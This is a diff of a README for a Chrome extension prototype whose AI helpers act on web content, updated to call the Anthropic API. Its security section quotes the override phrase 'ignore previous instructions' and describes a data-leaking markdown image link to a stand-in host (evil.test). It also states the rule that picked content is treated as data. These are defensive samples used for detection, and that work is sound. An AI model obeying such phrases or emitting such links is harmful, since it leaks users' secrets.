@@ -2,7 +2,7 @@
 
 # Skill Pet
 
-A Chrome extension prototype of the **Skill Companion** concepts. You keep a **squad of pets**, each one a group of AI skills with its own permissions. **Drag a pet onto your work** (a paragraph, a text field, an image, a Google Docs page, a Figma frame) and it offers only the skills that fit what's there. Anything that would change your work is a **proposal you approve** first. Models are called through **[OpenRouter](https://openrouter.ai)**.
+A Chrome extension prototype of the **Skill Companion** concepts. You keep a **squad of pets**, each one a group of AI skills with its own permissions. **Drag a pet onto your work** (a paragraph, a text field, an image, a Google Docs page, a Figma frame) and it offers only the skills that fit what's there. Anything that would change your work is a **proposal you approve** first. Pets run on **Claude**, called directly through the **Anthropic API** with the official SDK.
 
 ![Scout summarizing a picked paragraph on Wikipedia](docs/screenshots/summarize-on-page.png)
 
@@ -49,7 +49,7 @@ Each pet is one of eight characters: **cat, dog, bird, frog, bunny, bear, ghost,
 | Skill | Where it runs | What it does |
 |---|---|---|
 | Check for hidden instructions | **On this device** | Finds prompt injection in what you picked: "ignore previous instructions", fake system messages, requests to send data out or hide things from you, attempts to break out of the content wrapper, and **invisible text** (zero-width characters, text-direction overrides, Unicode "tag" characters used for ASCII smuggling). |
-| Spot sensitive data | **On this device** | Lists API keys and tokens (OpenAI/OpenRouter, AWS, GitHub, Slack, Google, Figma, JWTs, private keys), passwords, emails, phone numbers, card numbers (Luhn-checked) and ID numbers. |
+| Spot sensitive data | **On this device** | Lists API keys and tokens (Anthropic, OpenAI, OpenRouter, AWS, GitHub, Slack, Google, Figma, JWTs, private keys), passwords, emails, phone numbers, card numbers (Luhn-checked) and ID numbers. |
 | Review for bias & harm | Model | Flags biased, exclusionary or harmful wording or imagery, with neutral alternatives. |
 | Check AI output | Model | Claims to verify, signs of fabrication, overconfidence, and a reliability rating. |
 | Is this a scam? | Model | Phishing and social-engineering signals, a verdict, and what to do next. |
@@ -61,7 +61,7 @@ The two on-device skills never call the model: Security checks your data without
 1. **Before anything leaves the browser.** Every run from any pet, and the Studio's *Try it*, is checked in the **service worker**, the one place every request passes through before the network. No page script can reach it or skip it. If Security finds secrets, personal data or hidden instructions, the run **pauses** and shows what it found, masked (`sk-or-…89`, `j***@example.com`). You choose **Redact & send** (secrets become `[API KEY]`, `[EMAIL]`… and invisible characters are removed), **Send anyway**, or **Cancel**. Nothing is sent until you choose.
 2. **Untrusted output, before it acts.** Pets can rewrite your text and post Figma comments. Those are actions with side effects, so model output is treated as untrusted: Security checks it for invisible text, injected instructions, leaked secrets and **links that carry data out** (for example `![x](https://evil.test/p.png?d=<secret>)`). Leaking links and hidden text are **removed**, not just flagged, and the panel says so before you approve.
 3. **Containment.** Picked content goes to the model inside `<picked_content>` and the system prompt treats it as data. Content can no longer close or reopen that wrapper: tag lookalikes inside it are neutralised, and a unit test proves injected text stays inside.
-4. **Least privilege, visible.** The loading screen says exactly what is being sent and where ("Sending 41 words to the model (openrouter.ai), after a Security check"). Pets still only receive what their *Can read* permissions allow.
+4. **Least privilege, visible.** The loading screen says exactly what is being sent and where ("Sending 41 words to Claude (api.anthropic.com), after a Security check"). Pets still only receive what their *Can read* permissions allow.
 5. **Audit trail without the secrets.** Every History entry records what Security found, what you chose and where the data went ("Security: found secrets (1), personal data (1); masked 2 before sending"). History **never stores secrets or personal data**, even if you chose *Send anyway*: the saved input is always the masked version.
 
 **Threat model**
@@ -191,7 +191,12 @@ npm install && npm run build
 ```
 
 1. In `chrome://extensions`, turn on **Developer mode**, click **Load unpacked**, and pick the `extension/` folder. If it's already loaded, click the reload arrow instead.
-2. Options opens. Paste your **OpenRouter key**. Pick a **vision-capable model** (needed for images, Figma and Docs screenshots), e.g. a Claude, GPT-4o-class or Gemini model from [openrouter.ai/models](https://openrouter.ai/models).
+2. Options opens. Paste your **Anthropic API key** (create one at [platform.claude.com/settings/keys](https://platform.claude.com/settings/keys)). Pick a model:
+   - **Claude Opus 5.5** is the default.
+   - **Claude Sonnet 5.5** is faster and cheaper.
+   - **Claude Haiku 5.5** is the fastest and cheapest.
+
+   All three read images, which the Figma and Docs skills need. **Effort** (low by default) trades speed for more careful answers. If you used the OpenRouter version before, paste the new key: the old one isn't sent to Anthropic.
 3. *Optional:* paste a **Figma personal access token** (Figma › Settings › Security; file read + comments write) to enable frame text and comments.
 4. Reload any tabs that were already open. The squad appears at the bottom of every page.
 
@@ -200,7 +205,7 @@ npm install && npm run build
 ```
  page (any site)                              service worker                     outside
 ┌────────────────────────────────┐ Port  ┌───────────────────────────┐
-│ content.js                     │──────▶│ background.js             │──▶ openrouter.ai (stream)
+│ content.js                     │──────▶│ background.js             │──▶ api.anthropic.com (stream)
 │  dock · drag · select · cards  │◀──────│  keys live only here      │
 │  reads text / screenshots      │       │  captureVisibleTab        │──▶ api.figma.com
 │  approve → write back          │       │  figma.js (frame, comment)│
@@ -211,6 +216,7 @@ npm install && npm run build
 
 - The UI is in a closed shadow root, so page CSS/JS can't touch it or read results. Keys never enter the page.
 - Picked content goes to the model inside `<picked_content>`, and the system prompt treats it as data, not instructions.
+- `anthropic.js` makes one streaming Messages API call with the official `@anthropic-ai/sdk`, from the service worker only. It sends the effort setting, and on Opus and Sonnet turns on the API's refusal fallback: if a safety check declines a request, the API retries it on a suitable model. If the request is still declined, the pet says so. Errors (bad key, no credit, rate limits, overload) become plain messages.
 - `library.js` is pure and unit-tested. Skills and pets are plain JSON, so anything the Studio makes can be exported.
 
 ## Tests
@@ -225,7 +231,7 @@ npm run e2e
 
 No Playwright Chromium installed? Point the e2e run at any Chrome for Testing build: `CHROME_PATH=/path/to/chrome npm run e2e`.
 
-`npm test` has 40 unit tests covering matching, permissions, Figma URL parsing, request building, history, the OpenRouter client, and Security (secret/PII/injection detection, false positives, redaction, link removal, wrapper containment, adding Security to older libraries). `npm run e2e` loads the real extension in Chromium with OpenRouter and the Figma API **faked**, then checks:
+`npm test` has 42 unit tests covering matching, permissions, Figma URL parsing, request building, history, the Anthropic client (request shape, streaming, errors, refusals, Stop), and Security (secret/PII/injection detection, false positives, redaction, link removal, wrapper containment, adding Security to older libraries). `npm run e2e` loads the real extension in Chromium with the Anthropic API and the Figma API **faked**, then checks:
 - drag Quill onto a field → approve a rewrite (and that nothing changes before approval)
 - drag Pixel onto an image → a screenshot is sent
 - box-select a paragraph → click Scout → summarize
@@ -252,7 +258,7 @@ Screenshots go to `test/screenshots/`.
 - **Google Docs**: the extension reads by screenshot and can't write back into the doc. Commenting into Docs would need the Docs API (OAuth) or a Docs add-on.
 - **Canvas tracking is visual.** It can lose a spot that changes a lot (edited, re-styled) or that looks like something else nearby. When it loses one, it says so instead of guessing.
 - **Screenshots only cover what's visible.** Scroll so the thing is on screen first.
-- **Key handling**: each user brings their own OpenRouter key. A real product would put a backend in front.
+- **Key handling**: each user brings their own Anthropic API key. A real product would put a backend in front.
 
 ## Feasibility: extension vs. desktop app
 
